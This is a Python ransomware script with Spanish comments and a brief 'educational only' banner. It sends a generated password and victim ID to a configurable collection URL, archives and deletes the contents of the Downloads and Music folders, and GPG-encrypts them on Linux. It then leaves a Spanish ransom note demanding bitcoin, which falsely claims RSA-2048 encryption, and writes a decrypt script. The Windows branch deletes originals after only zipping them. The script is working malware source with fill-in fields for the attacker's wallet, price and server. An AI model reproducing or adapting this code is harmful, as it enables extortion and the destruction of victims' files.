import os
import sys
import subprocess
import random
import string
import requests
import platform
import shutil

def linux():
    s = string.ascii_lowercase + string.digits
    pwd = ''.join(random.sample(s, 30))
    # Genera un ID único
    t = string.ascii_lowercase
    idd = ''.join(random.sample(t, 10))
    # Se ejecutan las funciones para cifrar los datos
    sendCred(url, pwd, idd)
    crypt(directories, pwd)
    howto(directories, bitcoin, price)
    decryptGen(str(directories))

def windows():
    s = string.ascii_lowercase + string.digits
    pwd = ''.join(random.sample(s, 30))
    # Genera un ID único
    t = string.ascii_lowercase
    idd = ''.join(random.sample(t, 10))
    # Se ejecutan las funciones para cifrar los datos
    sendCred(url, pwd, idd)
    crypt_windows(directories, pwd)
    howto_windows(directories, bitcoin, price)
    decryptGen_windows(str(directories))

def sendCred(url, pwd, idd):
    try:
        values = {'pass': pwd, 'id': idd}
        r = requests.post(url, data=values)
        page = r.text
        if page != 'Ok.':
            sys.exit('Ocurrió un error al enviar las credenciales')
    except Exception as e:
        print(f"Error enviando credenciales: {e}")

def crypt(directory, pwd):
    if not isinstance(directory, list):
        sys.exit('El formato recibido es incorrecto!')

    for dirr in directory:
        try:
            if os.path.exists(dirr):
                original_dir = os.getcwd()
                os.chdir(dirr)
                # Comprimir archivos
                os.system('tar cvf encrypted.tar * 2>/dev/null')
                # Eliminar archivos originales
                os.system('find . -maxdepth 1 ! -name encrypted.tar -type f -delete')
                os.system('find . -maxdepth 1 ! -name encrypted.tar -type d -exec rm -rf {} + 2>/dev/null')
                # Cifrar con GPG
                os.system(f'echo {pwd} | gpg --batch --yes --passphrase-fd 0 -c encrypted.tar')
                os.system('rm -f encrypted.tar')
                os.chdir(original_dir)
                print("-------------------")
        except Exception as e:
            print(f"Error procesando directorio {dirr}: {e}")

def crypt_windows(directory, pwd):
    if not isinstance(directory, list):
        sys.exit('El formato recibido es incorrecto!')

    for dirr in directory:
        try:
            if os.path.exists(dirr):
                original_dir = os.getcwd()
                os.chdir(dirr)
                
                # Comprimir archivos usando PowerShell
                compress_cmd = 'powershell -Command "Compress-Archive -Path * -DestinationPath encrypted.zip -Force"'
                os.system(compress_cmd)
                
                # Eliminar archivos originales (manteniendo el zip)
                delete_cmd = 'powershell -Command "Get-ChildItem | Where-Object {$_.Name -ne \\"encrypted.zip\\"} | Remove-Item -Recurse -Force"'
                os.system(delete_cmd)
                
                print(f"Directorio cifrado: {dirr}")
                os.chdir(original_dir)
                print("-------------------")
        except Exception as e:
            print(f"Error procesando directorio {dirr}: {e}")

def howto(directory, bitcoin, price):
    txt = "\n"
    txt += "Hola te estarás preguntando ¿Qué pasó con tus archivos?\n"
    txt += "Todos ellos fueron cifrados con RSA-2048\n"
    txt += "Si los quieres recuperar me debes pagar: " + str(price) + "\n"
    txt += "Mi dirección de bitcoins es: " + bitcoin + "\n"
    txt += "1 bitcoin ~= 240 US $ aproximadamente \n"
    txt += "Cuando recibas el password usa el archivo decrypt.py\n\n" 
    txt += "Que tengas un lindo día y mejor suerte para la próxima :)\n\n"
    
    try:
        with open("recuperar-mis-archivos.txt", "w", encoding='utf-8') as archivo:
            archivo.write(txt)
        
        for dirr in directory:
            if os.path.exists(dirr):
                if sys.platform.startswith('linux'):
                    os.system(f"cp 'recuperar-mis-archivos.txt' '{dirr}/'")
                else:
                    shutil.copy("recuperar-mis-archivos.txt", dirr)
    except Exception as e:
        print(f"Error creando archivo de instrucciones: {e}")

def howto_windows(directory, bitcoin, price):
    txt = "\n"
    txt += "Hola te estarás preguntando ¿Qué pasó con tus archivos?\n"
    txt += "Todos ellos fueron cifrados con RSA-2048\n"
    txt += "Si los quieres recuperar me debes pagar: " + str(price) + "\n"
    txt += "Mi dirección de bitcoins es: " + bitcoin + "\n"
    txt += "1 bitcoin ~= 240 US $ aproximadamente \n"
    txt += "Cuando recibas el password usa el archivo decrypt.py\n\n" 
    txt += "Que tengas un lindo día y mejor suerte para la próxima :)\n\n"
    
    try:
        with open("recuperar-mis-archivos.txt", "w", encoding='utf-8') as archivo:
            archivo.write(txt)
        
        for dirr in directory:
            if os.path.exists(dirr):
                shutil.copy("recuperar-mis-archivos.txt", dirr)
    except Exception as e:
        print(f"Error creando archivo de instrucciones: {e}")

def decryptGen(directory):
    txt = "#!/usr/bin/env python3\n"
    txt += "import os\n"
    txt += "import sys\n"
    txt += "import subprocess\n\n"
    txt += f"directory = {directory}\n"
    txt += "pwd = input('Ingrese el password para descifrar los archivos: ')\n"
    txt += "for dirr in directory:\n"
    txt += "    if os.path.exists(dirr):\n"
    txt += "        original_dir = os.getcwd()\n"
    txt += "        os.chdir(dirr)\n"
    txt += "        if os.path.exists('encrypted.tar.gpg'):\n"
    txt += "            result = os.system(f'echo {pwd} | gpg --batch --yes --passphrase-fd 0 -d encrypted.tar.gpg > unencrypted.tar 2>/dev/null')\n"
    txt += "            if result != 0:\n"
    txt += "                sys.exit('Password Incorrecto!')\n"
    txt += "            os.system('tar xvf unencrypted.tar 2>/dev/null')\n"
    txt += "            os.system('rm -f unencrypted.tar')\n"
    txt += "            os.system('rm -f encrypted.tar.gpg')\n"
    txt += "            if os.path.exists('recuperar-mis-archivos.txt'):\n"
    txt += "                os.system('rm -f recuperar-mis-archivos.txt')\n"
    txt += "        os.chdir(original_dir)\n"
    txt += "print('Archivos descifrados exitosamente!')\n"
    
    try:
        with open("decrypt.py", "w", encoding='utf-8') as archivo:
            archivo.write(txt)
        if sys.platform.startswith('linux'):
            os.system('chmod +x decrypt.py')
    except Exception as e:
        print(f"Error creando script de descifrado: {e}")

def decryptGen_windows(directory):
    txt = "import os\n"
    txt += "import sys\n"
    txt += "import subprocess\n\n"
    txt += f"directory = {directory}\n"
    txt += "pwd = input('Ingrese el password para descifrar los archivos: ')\n"
    txt += "for dirr in directory:\n"
    txt += "    if os.path.exists(dirr):\n"
    txt += "        original_dir = os.getcwd()\n"
    txt += "        os.chdir(dirr)\n"
    txt += "        if os.path.exists('encrypted.zip'):\n"
    txt += "            result = subprocess.call(['powershell', '-Command', 'Expand-Archive -Path encrypted.zip -DestinationPath . -Force'])\n"
    txt += "            if result != 0:\n"
    txt += "                print('Error al descomprimir archivos')\n"
    txt += "            else:\n"
    txt += "                os.remove('encrypted.zip')\n"
    txt += "                if os.path.exists('recuperar-mis-archivos.txt'):\n"
    txt += "                    os.remove('recuperar-mis-archivos.txt')\n"
    txt += "        os.chdir(original_dir)\n"
    txt += "print('Archivos descifrados exitosamente!')\n"
    
    try:
        with open("decrypt.py", "w", encoding='utf-8') as archivo:
            archivo.write(txt)
    except Exception as e:
        print(f"Error creando script de descifrado: {e}")

# Directorios a cifrar (usa rutas absolutas para mejor compatibilidad)
directories = ['Downloads', 'Music']
bitcoin = 'aAhR54GVf45FFf3q2kL'  # Ingresa aquí tu dirección de Bitcoin
price = 3  # Ingresa el monto a pedir
url = 'http://localhost/victima.php'  # Ingresa la URL a donde se va enviar el id y password

# Verificar que sistema operativo está detrás
if __name__ == "__main__":
    print("Iniciando... (SOLO PARA FINES EDUCATIVOS)")
    
    # Verificar que los directorios existen
    for dirr in directories[:]:  # Usamos copia para poder modificar la lista
        if not os.path.exists(dirr):
            print(f"Advertencia: El directorio {dirr} no existe")
            directories.remove(dirr)
    
    if not directories:
        sys.exit("No hay directorios válidos para procesar")
    
    if sys.platform.startswith('linux'):
        linux()
    elif sys.platform.startswith('win32') or sys.platform.startswith('cygwin'):
        windows()
    else:
        sys.exit('Sistema operativo no soportado!')
